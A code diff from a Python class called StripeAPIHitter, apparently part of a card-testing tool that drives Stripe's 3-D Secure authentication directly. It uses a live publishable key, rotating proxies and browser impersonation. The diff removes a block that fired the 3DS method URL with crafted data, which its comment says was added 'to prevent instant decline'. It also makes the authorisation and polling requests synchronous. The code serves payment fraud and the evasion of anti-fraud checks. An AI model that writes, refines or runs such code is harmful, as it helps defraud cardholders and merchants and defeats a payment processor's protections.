@@ -752,19 +752,7 @@ class StripeAPIHitter:
                                         "key": self.pk_live
                                     }
                                     
-                                    # EMVCo Method URL execution to prevent instant decline
-                                    method_url = sdk.get('three_ds_method_url')
-                                    if method_url and server_trans_id:
-                                        try:
-                                            import base64
-                                            b64_method_data = base64.urlsafe_b64encode(json.dumps({"threeDSServerTransID": server_trans_id, "threeDSMethodNotificationURL": "https://stripe.com/3ds2/method_notification"}).encode()).decode().rstrip("=")
-                                            m_headers = headers.copy()
-                                            m_headers["content-type"] = "application/x-www-form-urlencoded"
-                                            asyncio.create_task(loop.run_in_executor(None, lambda: cffi_requests.post(method_url, headers=m_headers, data={"threeDSMethodData": b64_method_data}, proxies=proxies, timeout=2, impersonate=profile["impersonate"])))
-                                            await asyncio.sleep(1.2)
-                                        except: pass
-
-                                    auth_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                    auth_resp = cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"])
                                     
                                     try:
                                         data = auth_resp.json()
@@ -790,7 +778,7 @@ class StripeAPIHitter:
                                             "origin": "https://js.stripe.com",
                                             "referer": "https://js.stripe.com/"
                                         }
-                                        poll_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                        poll_resp = cffi_requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30, impersonate=profile["impersonate"])
                                         poll_json = poll_resp.json()
                                         
                                         status_2 = poll_json.get('status')
